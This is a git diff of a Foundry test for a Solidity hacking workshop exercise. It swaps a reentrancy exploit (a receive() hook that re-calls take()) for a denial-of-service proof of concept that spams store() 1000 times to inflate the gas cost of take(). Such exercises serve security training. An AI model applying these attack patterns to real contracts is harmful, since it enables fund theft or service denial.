@@ -6,13 +6,12 @@ import "forge-std/console.sol";
 import {Store} from "../src/SolidityHackingWorkshopV8.sol";
 
 /**
- reentrancy attack is possible in the for loop 
+DoS attack can be performed by spaming store() function 
+it make the execution cost very high due to for loop
  */
 
 contract Exercise1_Store is Test {
     Store public store;
-
-    // address attacker = vm.addr(3);
 
     function setUp() public {
         store = new Store();
@@ -27,42 +26,26 @@ contract Exercise1_Store is Test {
         vm.deal(address(this), 3 ether);
 
         // user a stores his money
-        // vm.startPrank(userA);
-        // store.store{value: 2 ether}();
-        // vm.stopPrank();
+        vm.startPrank(userA);
+        store.store{value: 2 ether}();
+        vm.stopPrank();
 
         // user b stores his money
         vm.startPrank(userB);
         store.store{value: 1 ether}();
         vm.stopPrank();
 
-        // attacker stores his money
-        // vm.startPrank(attacker);
-        store.store{value: 1 ether}();
-        console.log(uint256(address(this).balance));
-
-        // require(address(store).balance == 6 ether, "failed to store money");
-
+        console.log("gas used before spaming");
+        vm.startPrank(userA);
         store.take();
-
-        // require(
-        //     address(this).balance == 6 ether,
-        //     "invalid attacker balance after take execution"
-        // );
-
         vm.stopPrank();
+
+        for (uint i = 0; i < 1000; i++) {
+            store.store();
+        }
+
+        console.log("gas used after spaming");
+        vm.startPrank(userB);
+        store.take();
     }
-
-    receive() external payable {
-        address(store).call(abi.encodeWithSignature("take()"));
-    }
-
-    // receive() external payable {
-    //     console.log("receive");
-
-    //     console.log(uint(address(store).balance));
-    //     if (address(store).balance != 0) {
-    //         store.take();
-    //     }
-    // }
 }
